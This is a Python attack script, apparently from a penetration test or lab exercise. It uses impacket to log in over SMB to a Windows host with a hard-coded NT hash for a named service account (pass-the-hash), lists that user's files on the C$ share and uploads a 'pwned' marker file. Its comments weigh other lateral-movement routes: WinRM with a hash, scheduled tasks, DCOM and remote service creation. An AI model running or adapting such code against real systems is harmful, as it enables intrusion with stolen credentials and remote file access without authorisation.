#!/usr/bin/env python3
"""PTH WinRM using requests + NTLM (impacket-style hash)."""
import sys
sys.path.insert(0, "/tmp/pylibs")

# Try using spnego / requests_ntlm with hash
nthash = "3a5026b2aa5ef2cbb7cb6a7be3a2bcfa"
user = "svc-aegis-deploy"
domain = "ODYSSEY"
host = "172.16.0.10"

# Method: use winrm with transport ntlm and password empty + special
# From evil-winrm: uses -H which sets options[:password] = hash and :disable_certificate... 
# Looking at winrm gem - for hash it uses connection_opts[:pass_the_hash] = true

try:
    from requests_ntlm import HttpNtlmAuth
    import requests
    print("requests_ntlm", HttpNtlmAuth)
except Exception as e:
    print("no requests_ntlm", e)

# Use Impacket's winrms? 
# Fallback: smb put a ps1 and use... no exec

# Try rpcclient / schtasks via SMB with different approach - SMB write to ADMIN$ and use DCOM

from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, tsch, dtypes
from impacket.dcerpc.v5.dtypes import NULL
import string, random

# Use SMB to check Remote Desktop / WinRM port and create file via C$
conn = SMBConnection(host, host)
conn.login(user, "", domain=domain, lmhash="aad3b435b51404eeaad3b435b51404ee", nthash=nthash)
print("smb shares", conn.listShares()[:5] if False else "logged in")

# Try listing C$
try:
    files = conn.listPath("C$", "\\Users\\svc-aegis-deploy\\Documents\\*")
    print("docs", [f.get_longname() for f in files[:10]])
except Exception as e:
    print("list fail", e)

# Upload a marker
data = b"pwned\n"
tid = conn.connectTree("C$")
fid = conn.createFile("C$", "\\Users\\Public\\pwn_marker.txt")
conn.writeFile("C$", fid, data)
conn.closeFile("C$", fid)
print("uploaded marker")

# Try PowerShell WinRM from remote via... 
# Use sc.exe create via SCMR with different service approach - atexec failed

# Check if we can use named pipe / PS remoting over SMB?
print("done")
